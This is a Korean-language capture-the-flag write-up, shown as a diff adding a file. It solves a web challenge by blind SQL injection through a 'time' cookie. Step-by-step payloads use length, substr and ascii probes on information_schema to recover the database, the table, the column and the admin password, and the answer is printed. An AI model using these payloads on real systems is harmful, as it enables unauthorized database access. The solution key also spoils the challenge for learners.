@@ -1,0 +1,101 @@
+admin.php에 접속해봤습니다.
+
+password를 입력해야합니다.
+
+Edit This Cookie를 이용해서 time 쿠키값을 확인했습니다
+
+Blind SQL Injection이 뚫릴거 같습니다.
+
+DB 길이부터 알아내야하기 때문에 length함수를 사용합니다.
+
+1668611759 and length(database()) = 6 
+
+DB이름이  여섯글자 일 때 1을 반환 합니다.
+
+따라서 DB이름은 여섯글자 입니다.
+
+이제 DB명을 맞춰보겠습니다.
+
+1668611759 and substr(database(),1,1) = 'a’ 글자를 바꿔가면서 결과값을 봅니다.
+
+첫 번째 글자 : c
+
+두 번째 글자 : h
+
+세 번째 글자 : a
+
+네 번째 글자 : l
+
+다섯 번째 글자 : l
+
+여섯 번째 글자 : 2
+
+**DB명 : chall2**
+
+DB명을 알아냈으니 Table명을 구하면 됩니다.
+
+1668671964 and length((select table_name from information_schema.tables where table_schema='chall2' limit 0,1)) = 13
+
+Table 길이 : 13
+
+1668671964 and substr((select table_name from information_schema.tables where table_schema='chall2' limit 0,1),3,1) = '글자’
+
+1668671964 and ascii(substr((select table_name from information_schema.tables where table_schema='chall2' limit 0,1),12,1)) >= 112
+
+아스키를 이용하면 더 쉽게 구할 수 있습니다.
+
+첫 번째 글자 : a    
+
+두 번째 글자 : d
+
+세 번째 글자 : m
+
+네 번째 글자 :  i 
+
+다섯 번째 글자 : n
+
+여섯 번째 글자 :  _
+
+일곱 번째 글자 : a
+
+여덟 번째 글자 : r
+
+아홉 번째 글자 : e
+
+열 번째 글자 :  a 
+
+열 한 번째 글자 : _
+
+열 두 번째 글자 : p 
+
+열 세 번째 글자 : w
+
+Table명 : admin_area_pw 
+
+컬럼명을 찾기위해서 길이부터 찾겠습니다.
+
+1668671964 and length((select column_name from information_schema.columns where table_name='admin_area_pw')) = 2
+
+컬럼명 길이는 2 입니다.
+
+첫 번째 글자 : p 
+
+1668671964 and ascii(substr((select column_name from information_schema.columns where table_name='admin_area_pw' limit 0,1),1,1)) = 112
+
+두 번째 글자 : w
+
+1668671964 and ascii(substr((select column_name from information_schema.columns where table_name='admin_area_pw' limit 0,1),2,1)) = 119
+
+마지막으로 레코드값을 구해야합니다
+
+레코드 길이부터 구하겠습니다.
+
+1668671964 and length((select pw from chall2.admin_area_pw)) = 17
+
+이제 레코드값을 구해봅시다 
+
+1668671964 and ascii(substr((select pw from chall2.admin_area_pw limit 0,1),1,1)) = 17
+
+이런식으로 쿼리를 작성하면 됩니다.
+
+pw : kudos_to_beistlab
